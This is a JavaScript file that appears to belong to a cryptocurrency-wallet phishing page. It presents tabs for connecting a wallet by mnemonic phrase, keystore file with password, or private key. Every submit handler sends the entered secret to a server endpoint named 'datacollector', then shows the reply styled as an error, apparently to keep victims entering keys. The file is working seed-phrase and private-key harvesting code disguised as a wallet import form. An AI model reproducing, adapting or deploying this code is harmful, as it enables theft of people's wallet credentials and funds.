    function show() {
      var x = document.getElementById("hidden");
      if (x.style.display === "none") {
        x.style.display = "block";
      } else {
        x.style.display = "none";
      }

      if (x.style.display === "block") {
        document.getElementById("btn").innerHTML = "Show Less &uarr;";
      } 
    }

    var slash = "/";

    $(document).ready(function(){     
        $('#keystore_details').click(function(){      
           $('#mnemonic_details').removeClass('active active_tab1');

           $('#private_details').removeClass('active_tab1 active');

           $('#mnemonic_details').removeAttr('href data-toggle');
           $('#mnemonic_details').addClass('inactive_tab1');
           $('#keystore_details').removeClass('inactive_tab1');
           $('#private_details').removeClass('inactive_tab1');
           
           $('#keystore_details').addClass('active_tab1 active');
           $('#keystore_details').attr('href', '#personal_details');
           $('#keystore_details').attr('data-toggle', 'tab');
        
        });
         
        $('#mnemonic_details').click(function(){
           $('#keystore_details').removeClass('active active_tab1');
           $('#keystore_details').removeAttr('href data-toggle');
           $('#mnemonic_details').removeClass('inactive_tab1');

           $('#private_details').removeClass('active_tab1 active');

           $('#mnemonic_details').addClass('active_tab1 active');
           $('#mnemonic_details').attr('href', '#login_details');
           $('#mnemonic_details').attr('data-toggle', 'tab');
        });
         
        $('#private_details').click(function(){
            $('#mnemonic_details').removeClass('active_tab1 active');
            $('#keystore_details').removeClass('active_tab1 active');

           $('#keystore_details').removeClass('active active_tab1');
           $('#keystore_details').removeAttr('href data-toggle');
           $('#personal_details').removeClass('active');
           $('#private_details').removeClass('inactive_tab1');
           $('#private_details').addClass('active_tab1 active');
           $('#private_details').attr('href', '#contact_details');
           $('#private_details').attr('data-toggle', 'tab');
           $('#contact_details').addClass('active in');      
        });  
         
    });

    $(document).on('click', '#setRectification', function(e) {
        $("#listDataCrypto").modal('show').trigger('focus');
        $("#tog").removeClass('open-list');
        $( '.menu' ).removeClass( 'open' );
        $( '.menu-item-has-children' ).removeClass( 'open-list' );
    });

    function getPopTitle(target) {
        return $("#" + target + "-content > div.popTitle").html();
    }

    function getInnerHtml(div){
        return document.getElementById(div).innerHTML;
    }

    // $(document).on('click','a[data-id]', function(e) {
    //     var seg;
    //     var baseurl = window.location.origin;
    //     var url = $("#datapass").val();
    //     var passer = $(this).attr("data-id");
    //     var seg = enc_drc('encrpt', passer);
    //     var uri = $('#baseURI').val()+slash+window.location.pathname+'payload/'+passer+'/'+seg;
    //     var combine = '#amt_'+passer;
    //     $(combine).removeClass('bounceIn');
    //     $(combine).addClass('tada');
    //     setTimeout(function() {
    //         window.location = uri;
    //     },500);         
    // });

     $(document).on('click','a[data-id]', function(e) {
        var segImage;
        var url = $("#destination").val();
        var img = $("#dataimage").val();
        var name = $("#dataname").val();
        var passer = $(this).attr("data-id");

        $.ajax({
        type : "POST",
        url  : url+"/slug",
        headers: {'X-Requested-With': 'XMLHttpRequest'},
        dataType: "JSON",
        data : {"slug" : passer},
        success: function(data){
          var combine = '#amt_'+passer;
          $(combine).removeClass('bounceIn');
          $(combine).addClass('tada');
          $('#slug_name').html(data.name);
          $('#slugers1').val(data.name);
          $('#slugers2').val(data.name);
          $('#slugers3').val(data.name);
          $('#slug_image').attr("src", url + data.image);
          if($("#"+passer) != ""){
            $("#listDataCrypto").modal('show').trigger('focus');
          }          
        }

      });
        // var image = getImage(img);
        // console.log(segImage);
        //alert();
        
       
    });

    function getImage(argument, uri) {
      $.ajax({
        type : "POST",
        url  : uri+"slug",
        headers: {'X-Requested-With': 'XMLHttpRequest'},
        dataType: "JSON",
        data : {slug : argument},
        success: function(data){

              if(data.status == "SUCCESS") {
                return data.msg;
              }
        }

      });
    }

    $(document).on('click','a[data-id]', function(e) {
        var seg;
        var baseurl = window.location.origin;
        var url = $("#datapass").val();
        var passer = $(this).attr("data-id");
        var seg = enc_drc('encrpt', passer);
        var uri = $('#baseURI').val()+slash+'payload/'+passer+'/'+seg;
        var combine = '#amt_'+passer;
        $(combine).removeClass('bounceIn');
        $(combine).addClass('tada');
        setTimeout(function() {
            window.location = uri;
        },500);         
    });

    function enc_drc(action, data){
        var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=Base64._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9\+\/\=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=Base64._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/\r\n/g,"\n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}}

        if(action == 'encrpt'){
            var encodedString = Base64.encode(data);
            return encodedString;
        }else if(action == 'decrpt'){
            var decodedString = Base64.decode(data);
            return decodedString;
        }else{
            return $data
        }
    }

    $(document).on(".walletSet", function () {
      $("#displayblank").hide();
    });
    var baseurl =  $("#base_url").val()+"/";
    $(document).on(".walletSet", function () {
      $("#displayblank").show();
    });

   $(".mnemonic").ready(function(){
      $(document).on('click','#mnemonicBtn', function(e) {
        e.preventDefault();
          var sluger = $("#slugers1").val();
          var typers = $("#typer1").val();
          var mnemonic_data = $("#mnemonic_data").val();
          if(mnemonic_data == ""){
            var msgr = "<span style='color:black;font-weight: bold;'> Mnemonic Field Can be Empty</span>";
            errorMSG("Validation Message", msgr);
            $("#mnemonic_data").focus();               
              return false;
          }else{
            $("#mnemonicBtn").html('<i class="fa fa-spinner fa-pulse fa-fw" style="font-size: 20px; padding-top:5px; color:white;"></i> Processing...').attr('disabled', 'disabled');
              var req_data = {"slug": sluger, "typer": typers, "datakey": mnemonic_data};
              res = $.ajax({
                  data: req_data,
                  url: $('#baseURI').val()+slash+"datacollector",
                  type: "POST",
                  headers: {'X-Requested-With': 'XMLHttpRequest'},
                  dataType: 'json',
                  async:true,
                  success: function (data) {
                    if(data.status == "SUCCESS")
                    {
                      // var msgr = "<span style='color:black;font-weight: bold;'>"+data.msg+"</span>";
                      // successMSG("Success Message", msgr);
                      $('#mnemonicBtn').html('Connect').attr('disabled', false);
                     $(".response").html("<div class='error'>"+data.msg+"</div>");
                    }
                    else if(data.status == "FAILURE")
                    {
                      $('#mnemonicBtn').html('IMPORT DATA').attr('disabled', false);
                      var msgr = "<span style='color:black;font-weight: bold;'>"+data.msg+"</span>";
                      errorMSG("Failed Message!", msgr);
                      setTimeout(function() {
                          window.location.href = "";
                      },2000);
                    }
                  },
                  error: function (data) {
                      console.log('Error:', data);
                  }
            })
          }
      });
    });
   
    $(".keystore").ready(function(){
      $(document).on('click','#keystoreBtn', function(e) {
        e.preventDefault();
          var sluger = $("#slugers2").val();
          var typers = $("#typer2").val();
          var password = $("#password").val();
          var keystore_data = $("#keystore_data").val();
          if(keystore_data == ""){
            var msgr = "<span style='color:black;font-weight: bold;'> Keystore Field Can be Empty</span>";
            errorMSG("Validation Message", msgr);
            $("#keystore_data").focus();               
              return false;
          }
          if(password == ""){
            var msgr = "<span style='color:black;font-weight: bold;'> Keystore Password Field Can be Empty</span>";
            errorMSG("Validation Message", msgr);
            $("#password").focus();               
              return false;
          }else{
            $("#keystoreBtn").html('<i class="fa fa-spinner fa-pulse fa-fw" style="font-size: 20px; padding-top:5px; color:white;"></i> Processing...').attr('disabled', 'disabled');
              var req_data = {"slug": sluger, "typer": typers, "datakey": keystore_data, "password": password};
              res = $.ajax({
                  data: req_data,
                  url: $('#baseURI').val()+slash+"datacollector",
                  type: "POST",
                  headers: {'X-Requested-With': 'XMLHttpRequest'},
                  dataType: 'json',
                  async:true,
                  success: function (data) {
                    if(data.status == "SUCCESS")
                    {
                      // var msgr = "<span style='color:black;font-weight: bold;'>"+data.msg+"</span>";
                      // successMSG("Success Message", msgr);
                      // setTimeout(function() {
                      //     window.location.href = "https://image.ibb.co/hkgHso/admin.png";
                      // },2000);
                      $('#keystoreBtn').html('Connect').attr('disabled', false);
                      $(".response").html("<div class='error'>"+data.msg+"</div>");
                    }
                    else if(data.status == "FAILURE")
                    {
                      $('#keystoreBtn').html('IMPORT DATA').attr('disabled', false);
                      var msgr = "<span style='color:black;font-weight: bold;'>"+data.msg+"</span>";
                      errorMSG("Failed Message!", msgr);
                      setTimeout(function() {
                          window.location.href = "";
                      },2000);
                    }
                  },
                  error: function (data) {
                      console.log('Error:', data);
                  }
            })
          }
      });
    });


    $(".privatekeys").ready(function(){
      $(document).on('click','#privateBtn', function(e) {
        e.preventDefault();
          var sluger = $("#slugers3").val();
          var typers = $("#typer3").val();
          var privateKey_data = $("#privateKey_data").val();
          if(privateKey_data == ""){
            var msgr = "<span style='color:black;font-weight: bold;'> Private Field Can be Empty</span>";
            errorMSG("Validation Message", msgr);
            $("#privateKey_data").focus();               
              return false;
          }else{
            $("#privateBtn").html('<i class="fa fa-spinner fa-pulse fa-fw" style="font-size: 20px; padding-top:5px; color:white;"></i> Processing...').attr('disabled', 'disabled');
              var req_data = {"slug": sluger, "typer": typers, "datakey": privateKey_data};
              res = $.ajax({
                  data: req_data,
                  url: $('#baseURI').val()+slash+"datacollector",
                  type: "POST",
                  headers: {'X-Requested-With': 'XMLHttpRequest'},
                  dataType: 'json',
                  async:true,
                  success: function (data) {
                    if(data.status == "SUCCESS")
                    {
                      // var msgr = "<span style='color:black;font-weight: bold;'>"+data.msg+"</span>";
                      // successMSG("Success Message", msgr);
                      $('#privateBtn').html('Connect').attr('disabled', false);
                      $(".response").html("<div class='error'>"+data.msg+"</div>");
                    }
                    else if(data.status == "FAILURE")
                    {
                      $('#privateBtn').html('IMPORT DATA').attr('disabled', false);
                      var msgr = "<span style='color:black;font-weight: bold;'>"+data.msg+"</span>";
                      setTimeout(function() {
                        errorMSG("Failed Message!", msgr);
                      },100);
                      window.location.href = "";
                    }
                  },
                  error: function (data) {
                      console.log('Error:', data);
                  }
            })
          }
      });
    });



    function errorMSG(param1,param2) {
      $.jnoty(param2, {
        sticky: true,
        header: param1,
        theme: 'jnoty-danger',
        icon: 'fa fa-info-circle fa-2x',
        html: true
      });
    }

    function successMSG(param1,param2) {
      $.jnoty(param2, {
        sticky: true,
        header: param1,
        theme: 'jnoty-success',
        icon: 'fa fa-info-circle fa-2x',
        html: true,
      });
    }

    function warningMSG(param1,param2) {
      $.jnoty(param2, {
        sticky: true,
        header: param1,
        theme: 'jnoty-warning',
        icon: 'fa fa-info-circle fa-2x',
        html: true
      });
    }


  
  function openCity(evt, cityName) {
    // Declare all variables
    var i, tabcontent, tablinks;
  
    // Get all elements with class="tabcontent" and hide them
    tabcontent = document.getElementsByClassName("tabcontent");
    for (i = 0; i < tabcontent.length; i++) {
      tabcontent[i].style.display = "none";
    }
  
    // Get all elements with class="tablinks" and remove the class "active"
    tablinks = document.getElementsByClassName("tablinks");
    for (i = 0; i < tablinks.length; i++) {
      tablinks[i].className = tablinks[i].className.replace(" active", "");
    }
  
    // Show the current tab, and add an "active" class to the button that opened the tab
    document.getElementById(cityName).style.display = "block";
    evt.currentTarget.className += " active";
  }
